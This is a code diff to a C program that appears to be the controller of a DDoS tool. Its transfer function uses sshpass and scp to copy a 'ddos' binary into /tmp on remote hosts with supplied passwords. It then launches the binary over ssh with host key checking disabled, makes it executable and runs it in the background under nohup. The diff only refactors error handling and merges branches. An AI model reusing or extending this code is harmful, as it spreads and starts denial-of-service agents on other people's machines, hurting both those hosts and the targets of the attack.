@@ -10,6 +10,12 @@
 
 typedef struct addrinfo addrinfo;
 
+#define system_or_return(command) ({ \
+if (system(command) != 0) {          \
+    return;                          \
+}                                    \
+})
+
 //print menu
 void displayTextArt(void) {
     printf(R"EOF(
@@ -66,34 +72,28 @@ void transfer(void) {
             char ssh_keyscan_command[256];
             snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command),
                      "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
-            system(ssh_keyscan_command);
+            system_or_return(ssh_keyscan_command);
 
             // Transfer file using scp with sshpass
             char scp_command[256];
             snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port,
                      client_file_name, user, ip);
             printf("Created command : %s\n", scp_command); // print command created
-            system(scp_command);
+            system_or_return(scp_command);
         }
 
         // SSH connection to the user on the specified IP
         char ssh_command[256];
 
-        if (chmod_executed) {
-            // If CHMOD executed, don't do chmod+x
-            snprintf(ssh_command, sizeof(ssh_command),
-                     "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'",
-                     password, user, ip);
-        } else {
-            // Execute ssh with chmod
-            snprintf(ssh_command, sizeof(ssh_command),
-                     "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'",
-                     password, user, ip);
+        snprintf(ssh_command, sizeof(ssh_command),
+                 "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp %s && nohup ./ddos > /dev/null 2>&1'",
+                 password, user, ip, chmod_executed ? "" : "&& chmod +x ddos");
+
+        if (!chmod_executed)
             chmod_executed = true;
-        }
 
         printf("Created command : %s\n", ssh_command); // show the current command
-        system(ssh_command);
+        system_or_return(ssh_command);
     }
 
     fclose(file);
